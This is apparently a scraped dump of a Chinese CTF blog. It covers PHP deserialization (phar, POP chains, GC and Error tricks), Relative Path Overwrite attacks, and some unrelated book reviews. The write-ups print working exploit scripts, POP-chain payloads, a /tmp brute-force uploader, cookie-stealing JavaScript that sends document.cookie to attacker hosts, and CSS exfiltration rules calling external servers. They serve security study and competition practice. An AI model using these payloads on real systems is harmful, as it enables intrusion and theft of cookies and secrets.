unserialize($_GET[0]); // 传入A的序列化 throw new Error(\u0026#34;那么就从这里开始起航吧\u0026#34;); // 需绕 数组+i:0 对于A，写入\n\u0026lt;?php class A { public $config=\u0026#39;w\u0026#39;; } $a = new A(); echo serialize($a); // O:1:\u0026#34;A\u0026#34;:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;w\u0026#34;;} 读\n\u0026lt;?php class A { public $config=\u0026#39;r\u0026#39;; } $a = new A(); echo serialize($a); // O:1:\u0026#34;A\u0026#34;:1:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;r\u0026#34;;} 对于phar\n\u0026lt;?php class getflag { } $a[] = new getflag(); $a[] = 1; $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); // 设置stub，增加gif文件头 $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); // 添加要压缩的文件 $phar -\u0026gt; setMetadata($a); // 将自定义meta-data存入manifest $phar -\u0026gt; stopBuffering(); 将.metadata.bin中前面的一个i:1改为i:0后改签名\nfrom hashlib import sha1 file = open(\u0026#34;phar.phar\u0026#34;,\u0026#34;rb\u0026#34;).read() text = file[:-28] # 读取开始到末尾除签名外内容 last = file[-8:] # 读取最后8位的GBMB和签名flag new_file = text+sha1(text).digest() + last # 生成新的文件内容 此时sha1正确 open(\u0026#34;change.phar\u0026#34;,\u0026#34;wb\u0026#34;).write(new_file) python发包，避免特殊字符\nimport requests import gzip url = \u0026#39;http://localhost/temp/tttt.php\u0026#39; file = open(\u0026#34;./chang.phar\u0026#34;, \u0026#34;rb\u0026#34;) #打开文件 file_out = gzip.open(\u0026#34;./ars2.zip\u0026#34;, \u0026#34;wb+\u0026#34;)#创建压缩文件对象 file_out.writelines(file) file_out.close() file.close() requests.post( url, params={ 0: \u0026#39;O:1:\u0026#34;A\u0026#34;:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;w\u0026#34;;}\u0026#39; }, data={ 0: open(\u0026#39;./ars2.zip\u0026#39;, \u0026#39;rb\u0026#39;).read() } ) # 写入 res = requests.post( url, params={ 0: \u0026#39;O:1:\u0026#34;A\u0026#34;:1:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;r\u0026#34;;}\u0026#39; }, data={ 0: \u0026#39;phar://tmp/a.txt\u0026#39; } ) # 触发 print(res.text) 得到flag\n参考：浅析GC回收机制与phar反序列化\n[GFCTF 2021]文件查看器 User.class.php\n\u0026lt;?php error_reporting(0); class User{ public $username; // new Myerror(); public $password; // [new User(), \u0026#34;check\u0026#34;]; public function login(){ include(\u0026#34;view/login.html\u0026#34;); if(isset($_POST[\u0026#39;username\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;password\u0026#39;])){ $this-\u0026gt;username=$_POST[\u0026#39;username\u0026#39;]; $this-\u0026gt;password=$_POST[\u0026#39;password\u0026#39;]; if($this-\u0026gt;check()){ header(\u0026#34;location:./?c=Files\u0026amp;m=read\u0026#34;); } } } public function check(){ if($this-\u0026gt;username===\u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $this-\u0026gt;password===\u0026#34;admin\u0026#34;){ return true; }else{ echo \u0026#34;{$this-\u0026gt;username}的密码不正确或不存在该用户\u0026#34;; // Myerror::__toString return false; } } public function __destruct(){ (@$this-\u0026gt;password)(); // pop入口 可以通过数组形式访问任意类的任意方法 User::check } public function __call($name,$arg){ // 不存在方法 ($name)(); } } Files.class.php\n\u0026lt;?php class Files{ public $filename; public function __construct(){ $this-\u0026gt;log(); } public function read(){ include(\u0026#34;view/file.html\u0026#34;); if(isset($_POST[\u0026#39;file\u0026#39;])){ // 传入文件名 $this-\u0026gt;filename=$_POST[\u0026#39;file\u0026#39;]; }else{ die(\u0026#34;请输入文件名\u0026#34;); } $contents=$this-\u0026gt;getFile(); echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;textarea class=\u0026#34;file_content\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#39;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$contents; } public function filter(){ if(preg_match(\u0026#39;/^\\/|phar|flag|data|zip|utf16|utf-16|\\.\\.\\//i\u0026#39;,$this-\u0026gt;filename)){ // phar无疑 虽然被ban了 加filter绕过(utf-16提示 throw new Error(\u0026#34;这不合理\u0026#34;); } } public function getFile(){ $contents=file_get_contents($this-\u0026gt;filename); $this-\u0026gt;filter(); // 对filename过滤 if(isset($_POST[\u0026#39;write\u0026#39;])){ file_put_contents($this-\u0026gt;filename,$contents); // 写入内容 phar } if(!empty($contents)){ return $contents; // 读phar 触发反序列化 }else{ die(\u0026#34;该文件不存在或者内容为空\u0026#34;); } } public function log(){ $log=new Myerror(); } public function __get($key){ // 读不存在属性 ($key)($this-\u0026gt;arg); // 目标 可rce // arg = \u0026#39;cat /f*\u0026#39;; } } Myerror.class.php\n\u0026lt;?php class Myerror{ public $message; // new Files(); public function __construct(){ ini_set(\u0026#39;error_log\u0026#39;,\u0026#39;/var/www/html/log/error.txt\u0026#39;); ini_set(\u0026#39;log_errors\u0026#39;,1); } public function __tostring(){ $test=$this-\u0026gt;message-\u0026gt;{$this-\u0026gt;test}; // Files::__get return \u0026#34;test\u0026#34;; // test = \u0026#39;system\u0026#39; } } 构造pop链时，注意password\n$user = new User(); $files = new Files(); $myerror = new Myerror(); $files-\u0026gt;arg = \u0026#39;cat /f*\u0026#39;; $myerror-\u0026gt;message = $files; $myerror-\u0026gt;test = \u0026#39;system\u0026#39;; $user-\u0026gt;username = $myerror; // $user-\u0026gt;password = [new User(), \u0026#34;check\u0026#34;]; 这样会使$user的两个字段都赋不上值 $user-\u0026gt;password = [$user, \u0026#34;check\u0026#34;]; echo serialize($user); // O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;O:7:\u0026#34;Myerror\u0026#34;:2:{s:7:\u0026#34;message\u0026#34;;O:5:\u0026#34;Files\u0026#34;:2:{s:8:\u0026#34;filename\u0026#34;;N;s:3:\u0026#34;arg\u0026#34;;s:3:\u0026#34;dir\u0026#34;;}s:4:\u0026#34;test\u0026#34;;s:6:\u0026#34;system\u0026#34;;}s:8:\u0026#34;password\u0026#34;;a:2:{i:0;r:1;i:1;s:5:\u0026#34;check\u0026#34;;}} 经测试可以触发，之后就是如何写phar的问题了\n看代码可以知道没有直接的unserialize点，那大概率是phar，虽然没有上传处 但是Myerror类的构造方法中可以写日志\n可以看到日志中有脏数据，我们需要借助过滤器的编码来删去；首先是清空文件内容，可以用php://filter/read=consumed/resource=log/error.txt\n之后观察日志内容，脏数据+文件内容+脏数据，只用b64肯定不行，我们尝试把除文件之外的其他内容变为b64的非法字符，这样最后b64解码即可\n我们可以先将数据转换为utf-16le的格式，由原先的utf-8转换为utf-16le时，每一位字符后面都会直接添加一个不可见字符\\0，再转回utf-8时，之后后面带\\0的才会被转换 其余的会被当成乱码；这符合我们的要求\n题中utf-16le被ban了，我们用ucs-2来代替\n最后要处理的时空字节，file_get_contents在加载有空字节的文件时会报warning，我们用quoted-printable这种编码，即php://filter/convert.quoted-printable-decode这种过滤器；它对于所有可打印字符的ascii码（除=以外）都不变，对于=和不可打印的ascii码以及非ascii码的数据编码时 会先将每个字节的二进制代码用两个16进制数表示 再在前面加一个等号，比如=-\u0026gt;=3D\n我们的编码顺序\nbase64-encode-\u0026gt; utf-8-\u0026gt; ucs-2-\u0026gt; convert.quoted-printable-decode 会被解码的顺序\nconvert.quoted-printable-decode-\u0026gt; ucs-2-\u0026gt; utf-8-\u0026gt; base64-decode 经过这三次编码后就会有纯净的phar文件内容\n最最最后的考点，throw new Error的存在，我们还需要改i:0和签名\n\u0026lt;?php class User{ public $username; public $password; public function __construct() { $this-\u0026gt;username = new Myerror(); } } class Files{ public $filename; } class Myerror{ public $message; } $user = new User(); $files = new Files(); $myerror = new Myerror(); $files-\u0026gt;arg = \u0026#39;cat /f*\u0026#39;; $myerror-\u0026gt;message = $files; $myerror-\u0026gt;test = \u0026#39;system\u0026#39;; $user-\u0026gt;username = $myerror; $user-\u0026gt;password = [$user, \u0026#34;check\u0026#34;]; $a = [$user, null]; $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); // 设置stub，增加gif文件头 $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); // 添加要压缩的文件 $phar -\u0026gt; setMetadata($a); // 将自定义meta-data存入manifest $phar -\u0026gt; stopBuffering(); 改签名和i:0（略\n编码\n\u0026lt;?php $b=file_get_contents(\u0026#39;change.phar\u0026#39;); $payload=iconv(\u0026#39;utf-8\u0026#39;,\u0026#39;UCS-2\u0026#39;,base64_encode($b)); file_put_contents(\u0026#39;payload.txt\u0026#39;,quoted_printable_encode($payload)); $s = file_get_contents(\u0026#39;payload.txt\u0026#39;); $s = preg_replace(\u0026#39;/=\\r\\n/\u0026#39;, \u0026#39;\u0026#39;, $s); echo $s; 开打：首先写payload，然后第一个过滤器\nphp://filter/write=convert.quoted-printable-decode/resource=log/error.txt 第二个\nphp://filter/write=convert.iconv.ucs-2.utf-8/resource=log/error.txt 第三个\nphp://filter/write=convert.base64-decode/resource=log/error.txt 这里出现一个问题，末尾等号少一个，我们需要在payload末尾再加一个=00=3D让等号正常露出\n改好之后清空日志文件，直接三个过滤器一起用\nphp://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt 得到flag\n参考：wp\n原生报错/异常类 Error/Exception - 绕md5 [极客大挑战 2020]Greatphp \u0026lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) ){ if(!preg_match(\u0026#34;/\\\u0026lt;\\?php|\\(|\\)|\\\u0026#34;|\\\u0026#39;/\u0026#34;, $this-\u0026gt;syc, $match)){ eval($this-\u0026gt;syc); } else { die(\u0026#34;Try Hard !!\u0026#34;); } } } } if (isset($_GET[\u0026#39;great\u0026#39;])){ unserialize($_GET[\u0026#39;great\u0026#39;]); } else { highlight_file(__FILE__); } ?\u0026gt; 平常都是用数组，但是这是在类里面，数组就不行了，得用原生类Error（php7）或Exception（php5 or 7），它有__toString方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被__toString调用后输出信息一样），但是本身不相同（传入参数不等）\n$payload = \u0026#34;?\u0026gt;\u0026lt;?=include~\u0026#34;.urldecode(urlencode(~\u0026#39;/flag\u0026#39;)).\u0026#34;?\u0026gt;\u0026#34;; $a = new Error($payload,1); $b = new Error($payload,2); $s = new SYCLOVER(); $s-\u0026gt;syc = $a; $s-\u0026gt;lover = $b; echo urlencode(serialize($s)); 注意$a和$b写到一行\nError/Exception - XSS 参考：关于如何利用php的原生类进行XSS\n\u0026lt;?php $a = new Error(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;); $b = serialize($a); echo urlencode($b); echo unserialize($b); 二次序列化/fast destruct https://zhuanlan.zhihu.com/p/405838002\n\u0026lt;?php $raw = \u0026#39;O:1:\u0026#34;A\u0026#34;:1:{s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;b\u0026#34;;}\u0026#39;; echo serialize(unserialize($raw)); //O:1:\u0026#34;A\u0026#34;:1:{s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;b\u0026#34;;} 上面是一个相当正常的二次序列化的栗子（将序列化结果反序列化后再序列化），值得注意的是这里并不是真的有一个类A，在操作时 php内部会把不存在的类转换成__PHP_Incomplete_Class这种特殊的类，同时将原始的类名A存放在__PHP_Incomplete_Class_Name这个属性中，其余属性存放方式不变；而我们在序列化这个对象的时候，serialize遇到__PHP_Incomplete_Class这个特殊类会倒推回来，序列化成__PHP_Incomplete_Class_Name值为类名的类，我们看到的序列化结果不是O:22:\u0026quot;__PHP_Incomplete_Class_Name\u0026quot;:2:{xxx}而是O:1:\u0026quot;A\u0026quot;:1:{s:1:\u0026quot;a\u0026quot;;s:1:\u0026quot;b\u0026quot;;}，所以如果我们构造\n\u0026lt;?php $raw = \u0026#39;a:2:{i:0;O:8:\u0026#34;stdClass\u0026#34;:1:{s:3:\u0026#34;abc\u0026#34;;N;}i:1;O:22:\u0026#34;__PHP_Incomplete_Class\u0026#34;:1:{s:3:\u0026#34;abc\u0026#34;;N;}}\u0026#39;; var_dump(unserialize($raw)); var_dump(unserialize(serialize(unserialize($raw)))); 可以注意到在二次序列化后__PHP_Incomplete_Class为空，出现serialize(unserialize($x))!=$x的情况\n[强网杯 2021]WhereIsUWebShell https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5\n\u0026lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--\u0026gt; \u0026lt;?php // index.php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); if(!isset($_COOKIE[\u0026#39;ctfer\u0026#39;])){ setcookie(\u0026#34;ctfer\u0026#34;,serialize(\u0026#34;ctfer\u0026#34;),time()+3600); }else{ include \u0026#34;function.php\u0026#34;; echo \u0026#34;I see your Cookie\u0026lt;br\u0026gt;\u0026#34;; $res = unserialize($_COOKIE[\u0026#39;ctfer\u0026#39;]); if(preg_match(\u0026#39;/myclass/i\u0026#39;,serialize($res))){ throw new Exception(\u0026#34;Error: Class \u0026#39;myclass\u0026#39; not found \u0026#34;); } } highlight_file(__FILE__); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; highlight_file(\u0026#34;myclass.php\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; highlight_file(\u0026#34;function.php\u0026#34;); \u0026lt;?php // myclass.php class Hello{ public function __destruct() { if($this-\u0026gt;qwb) echo file_get_contents($this-\u0026gt;qwb); } } ?\u0026gt; \u0026lt;?php // function.php function __autoload($classname){ require_once \u0026#34;/var/www/html/$classname.php\u0026#34;; } 简化一下就是\nif (preg_match(\u0026#39;/myClass/i\u0026#39;, unserialize(serialize($_COOKIE[\u0026#39;ctfer\u0026#39;])))){ throw new Exception(\u0026#34;Error: Class \u0026#39;myclass\u0026#39; not found \u0026#34;); } 很显然上下文中没有myClass这个类 二次序列化之后会直接报错，其中一种处理方式是去掉末尾的}\nO:7:\u0026#34;myclass\u0026#34;:1:{s:1:\u0026#34;h\u0026#34;;O:5:\u0026#34;Hello\u0026#34;:1:{s:3:\u0026#34;qwb\u0026#34;;s:36:\u0026#34;e2a7106f1cc8bb1e1318df70aa0a3540.php\u0026#34;;} O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D 或者当属性为空时，属性值反序列化之后不会赋值到对象上，这样就能绕过myclass的限制（修改序列化数字元素个数）\nO:8:\u0026#34;stdClass\u0026#34;:4:{s:0:\u0026#34;\u0026#34;;O:7:\u0026#34;myclass\u0026#34;:0:{}s:1:\u0026#34;b\u0026#34;;O:5:\u0026#34;Hello\u0026#34;:1:{s:3:\u0026#34;qwb\u0026#34;,s:36:\u0026#34;e2a7106f1cc8bb1e1318df70aa0a3540.php\u0026#34;;}} // e2a7106f1cc8bb1e1318df70aa0a3540.php \u0026lt;?php include \u0026#34;bff139fa05ac583f685a523ab3d110a0.php\u0026#34;; include \u0026#34;45b963397aa40d4a0063e0d85e4fe7a1.php\u0026#34;; // bff139fa05ac583f685a523ab3d110a0.php function PNG($file)\t// 处理上传的PNG图片 { if(!is_file($file)){die(\u0026#34;我从来没有见过侬\u0026#34;);} $first = imagecreatefrompng($file); if(!$first){ die(\u0026#34;发现了奇怪的东西2333\u0026#34;); } $size = min(imagesx($first), imagesy($first));\t// 以最小宽度为限切割为正方形 我们直接生成的时候就搞个正方形 unlink($file); $second = imagecrop($first, [\u0026#39;x\u0026#39; =\u0026gt; 0, \u0026#39;y\u0026#39; =\u0026gt; 0, \u0026#39;width\u0026#39; =\u0026gt; $size, \u0026#39;height\u0026#39; =\u0026gt; $size]); if ($second !== FALSE) { imagepng($second, $file); imagedestroy($second);//销毁，清内存 } imagedestroy($first); } // 45b963397aa40d4a0063e0d85e4fe7a1.php function GenFiles(){ $files = array(); $str = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $len=strlen($str)-1; for($i=0;$i\u0026lt;10;$i++){ $filename=\u0026#34;php\u0026#34;; for($j=0;$j\u0026lt;6;$j++){ $filename .= $str[rand(0,$len)]; } // file_put_contents(\u0026#39;/tmp/\u0026#39;.$filename,\u0026#39;flag{fake_flag}\u0026#39;); $files[] = $filename; } return $files; } $file = isset($_GET[\u0026#39;72aa377b-3fc0-4599-8194-3afe2fc9054b\u0026#39;])?$_GET[\u0026#39;72aa377b-3fc0-4599-8194-3afe2fc9054b\u0026#39;]:\u0026#34;404.html\u0026#34;; $flag = preg_match(\u0026#34;/tmp/i\u0026#34;,$file); if($flag){ PNG($file); } include($file);\t// 包含那个PNG $res = @scandir($_GET[\u0026#39;dd9bd165-7cb2-446b-bece-4d54087185e1\u0026#39;]); if(isset($_GET[\u0026#39;dd9bd165-7cb2-446b-bece-4d54087185e1\u0026#39;])\u0026amp;\u0026amp;$_GET[\u0026#39;dd9bd165-7cb2-446b-bece-4d54087185e1\u0026#39;]===\u0026#39;/tmp\u0026#39;){ $somthing = GenFiles(); $res = array_merge($res,$somthing); } // /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=x\u0026amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp shuffle($res); @print_r($res); ?\u0026gt; 我们利用LFI via segmentfault那个技巧 | LFI via SegmentFault\ninclude.php?file=php://filter/string.strip_tags/resource=/etc/passwd string.strip_tags可以导致php在执行过程中Segment Fault\n如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）\n# -*- coding: utf-8 -*- import requests import string import itertools charset = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; base_url = \u0026#34;http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com\u0026#34; def upload_file_to_include(url, file_content): files = {\u0026#39;file\u0026#39;: (\u0026#39;evil.jpg\u0026#39;, file_content, \u0026#39;image/jpeg\u0026#39;)} try: response = requests.post(url, files=files) print(response) except Exception as e: print(e) def generate_tmp_files(): with open(\u0026#39;miao.png\u0026#39;, \u0026#39;rb\u0026#39;) as fin: file_content = fin.read() phpinfo_url = \u0026#34;%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd\u0026#34; % ( base_url) length = 6 times = int(len(charset) ** (length / 2)) for i in range(times): print(\u0026#34;[+] %d / %d\u0026#34; % (i, times)) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \u0026#34;__main__\u0026#34;: main() 反弹shell，suid提权后翻找flag\n","date":"2022-04-24T21:42:33+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/","section":"posts","tags":["PHP","unserialize"],"title":"php反序列化中的报错\u0026GC与二次序列化问题"},{"categories":["NOTES\u0026SUMMARY"],"contents":"http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/\nRPO指Relative Path Overwrite 相对路径覆盖，利用浏览器和服务器的解析差异 将页面中使用相对路径引入的静态资源文件进行替换，完成RPO攻击\n最常见的就是对url path的解析差异，比如这样的url\nhttp://192.168.31.175/test%2findex.html 默认情况下apache会认为请求的是test%2findex.html，无法访问，而Nginx会将%2f解析为/ 从而认为请求的是test文件夹下的index.html，正常访问（可以通过修改路由规则来影响这些）\n另一个需要满足的条件是页面静态资源文件的相对路径，以下面的题为例\n[强网杯 2018]share mind *没有找到docker文件，以下内容参考wp1 | wp2\n我们可以在report页面给bot提交一个link，还可以写note，如果不写标题只写内容的话在view时文章页面是直接打印的内容（无\u0026lt;h1\u0026gt;），而两个都写了的话是把文章标题和内容都输出在html标签之间的（有\u0026lt;h1\u0026gt;）\n在页面源码中我们可以发现jquery.min.js这个文件是使用的相对路径的方式引入到index.php页面\n也就是说如果访问的页面是http://39.107.33.96:20000/index.php/则会引入http://39.107.33.96:20000/index.php/static/js/jquery.min.js，结合我们前面提过的url解析问题，如果访问的页面是http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f 浏览器则会尝试引入http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2fstatic/js/jquery.min.js，而这个url请求的页面实际上还是我们的Note，也就是note内容将作为jquery.min.js被引入页面，如果note部分是payload，那么访问http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f就会执行\n我们可以构造类似这样的payload来偷cookie\n(new Image()).src=\u0026#39;http://vps-ip:port/?cookie=\u0026#39;+document.cookie 页面对引号做了转义，我们用String.fromCharCode\n(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,55,101,52,122,119,48,99,101,121,101,46,105,111,63)+document.cookie; cookie提示我们打另一个目录，构造exp\nvar iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101)); iframe.src = String.fromCharCode(47,81,87,66,95,102,108,52,103,47,81,87,66,47); iframe.id = String.fromCharCode(102,114,97,109,101); document.body.appendChild(iframe); iframe.onload = function (){ var c = document.getElementById(String.fromCharCode(102,114,97,109,101)).contentWindow.document.cookie; var y1r0nz = document.createElement(String.fromCharCode(108,105,110,107)); y1r0nz.setAttribute(String.fromCharCode(114,101,108),String.fromCharCode(112,114,101,102,101,116,99,104)); y1r0nz.setAttribute(String.fromCharCode(104,114,101,102), String.fromCharCode(47,47,55,101,52,122,119,48,46,99,101,121,101,46,105,111,47,63,102,108,97,103,61) + c); document.head.appendChild(y1r0nz); } 经过浏览器渲染以后就是下述的两行html代码\n\u0026lt;iframe id=\u0026#34;frame\u0026#34; src=\u0026#34;/QWB_fl4g/QWB/\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie\u0026#34;\u0026gt; prefetch属性规定了当前文档在链接文档之前被调用，这样就可以外带对应路径下的cookie了\n[pwnhub 0618]大物必须过 wp | wp2\nreport_bug.php页面可以提交link，classes.php页面引入css时使用了相对路径进行加载\n\u0026lt;linkrel=\u0026#34;stylesheet\u0026#34;type=\u0026#34;text/css\u0026#34;href=\u0026#34;../../classes.css\u0026#34;\u0026gt; 与上面的思路相同，payload\nhttp://52.80.19.55/user.php/69/0/..%2f..%2f..%2fclasses.php/0 当访问这个url时，classes.css会被/user.php/69对应的内容所覆盖\n至于payload的内容，不同于我们常见的js payload\n*{}*{background-image:url(http://vpsip);}*{} [36c3CTF 2018]urlstorage dockerfile | wp （由于dockerfile用的ubuntu17 无法复现）\n页面的css加载使用相对路径（可以进行rpo 控制css），csp信息如下\nframe-ancestors \u0026#39;none\u0026#39;; form-action \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39;; font-src \u0026#39;self\u0026#39; ; style-src \u0026#39;self\u0026#39;; /urlstorage处可以提交name和url，存在csrf（可以任意修改他人的url）\n/flag?token=xxx处存在xss\n思路：通过可以覆盖的css信息模糊匹配/爆破出flag\n首先是爆破token，第一位字符：\na[href^=flag\\?token\\=0]{background: url(//xxx.pw/rpo/?c=1);} a[href^=flag\\?token\\=1]{background: url(//xxx.pw/rpo/?c=1);} ... a[href^=flag\\?token\\=f]{background: url(//xxx.pw/rpo/?c=f);} 第二位字符：\na[href^=flag\\?token\\=10]{background: url(//xxx.pw/rpo/?c=10);} a[href^=flag\\?token\\=11]{background: url(//xxx.pw/rpo/?c=11);} 匹配flag时的坑点在于css选择器在匹配的时候首字符不能是数字，而flag的开头为34c3，所以使用css的模糊匹配\n#flag[value*=C3_1]{background: url(http://xxx.pw/?flag=C3_1);} 或者16进制编码\n#flag[value^=\\33\\34\\43\\33]{background: url(http://xxx.pw/?34c3);} 之后利用之前的xss点修改base标签进行rpo，获取flag\nhttp://192.168.42.134:8080/flag?token=cdebcc090a8b4e339b876c33ad1c0acb%3C/title%3E%3Cbase%20href=urlstorage/123%3E ","date":"2022-04-24T21:39:29+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/","section":"posts","tags":["RPO"],"title":"RPO攻击学习笔记"},{"categories":[],"contents":"关于每集的简评在这个知乎回答中 link_here\n待更新\n","date":"2022-04-24T15:10:07+08:00","permalink":"https://amiaaaz.github.io/relax/goodbye-villanelle/","section":"relax","tags":[],"title":"Killing Eve完结随笔"},{"categories":[],"contents":" 《幸福的勇气》岸见一郎/古贺史健 ⭐ ⭐ ⭐ ⭐ ⭐ 作为《被讨厌的勇气》的姊妹篇，仍旧是通过对话的形式深入浅出的讲述阿德勒心理学。对我帮助最大的是第一章的“无法改变的真正理由”、“你的现在决定了过去”和“可恶的他人，可怜的自己”这几节。人生最大的课题是认清世界后与自己和解\n《消失的13级台阶》高野和明 ⭐ ⭐ ⭐ 书封有说是“罗翔推荐”，看完后我才意识到受到推荐的原因是里面涉及到了一些关于“是否废除死刑”的讨论，而在推理小说的核心谜题与诡计上在我看来并不十分出彩\n《克莱因壶》 冈岛二人 ⭐ ⭐ ⭐ ⭐ ⭐ 非常棒的科幻悬疑小说！虽然成书时间非常早，但看的时候一点都不会觉得过时。主要内容可以类比《盗梦空间》，虽然不及诺兰电影那样的冲击力，但文字仍然值得一看，非常棒\n《沉默的大多数》 王小波 ⭐ ⭐ ⭐ ⭐ ⭐ 前不久是王小波逝世25周年，之前也只是熟名字不熟作品，于是捡起一本来看，只能说爱惨了。杂文有一股鲁迅先生的风骨在其中，同时充满了黑色幽默，每翻几页都会有让我捧腹的片段出现，对于现实问题的思考和批判更是不留情面，角度犀利；之后会看更多王小波的书\n《走在人生边上》杨绛 ⭐ ⭐ ⭐ ⭐ 杨绛先生九十多岁时写的，读的时候就像老者在身边谆谆教诲，天然就有让人放松的奇效\n","date":"2022-04-24T15:04:31+08:00","permalink":"https://amiaaaz.github.io/relax/march-april-reading-list/","section":"relax","tags":[],"title":"3,4月书单"},{"categories":["CTF"],"contents":"easy unserialize 一个pop链的构造和throw error的绕过\n\u0026lt;?php $talk = \u0026#39;111\u0026#39;; $flag = \u0026#39;flag{here}\u0026#39;; class one { public $object; // new second(); public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \u0026#34;Happy_func\u0026#34; \u0026amp;\u0026amp; $prev === \u0026#34;year_parm\u0026#34;) { echo \u0026#39;success\u0026#39;; global $talk; echo \u0026#34;$talk\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; global $flag; echo $flag; // get flag here [7] } }); } public function __destruct() { @$this-\u0026gt;object-\u0026gt;add(); // second::__call [1] } public function __toString() { return $this-\u0026gt;object-\u0026gt;string; // third::__get [4] } } class second { protected $filename; // new one(); public function __construct($filename){ $this-\u0026gt;filename = $filename; } protected function addMe() { return \u0026#34;Wow you have sovled\u0026#34;.$this-\u0026gt;filename; // one::__toString [3] } public function __call($func, $args) { // 不存在方法 call_user_func([$this, $func.\u0026#34;Me\u0026#34;], $args); // second::addMe [2] // one::MeMeMe [6] } } class third { private $string; public function __construct($string) {\t// 构造pop时注意手动添加这个构造方法 或者直接赋值也可 $this-\u0026gt;string = $string; } public function __get($name) { // 不存在属性 $var = $this-\u0026gt;$name; $var[$name](); // second::__call [5] } } $one = new one(); $one2 = new one(); $one3 = new one(); $third = new third([\u0026#39;string\u0026#39;=\u0026gt;[$one3, \u0026#39;MeMeMe\u0026#39;]]); $one2-\u0026gt;object = $third; $second = new second($one2); $one3-\u0026gt;year_parm = [\u0026#39;Happy_func\u0026#39;]; $one-\u0026gt;object = $second; // unserialize(serialize($one)); $r = [$one, null]; echo urlencode(serialize($r)); 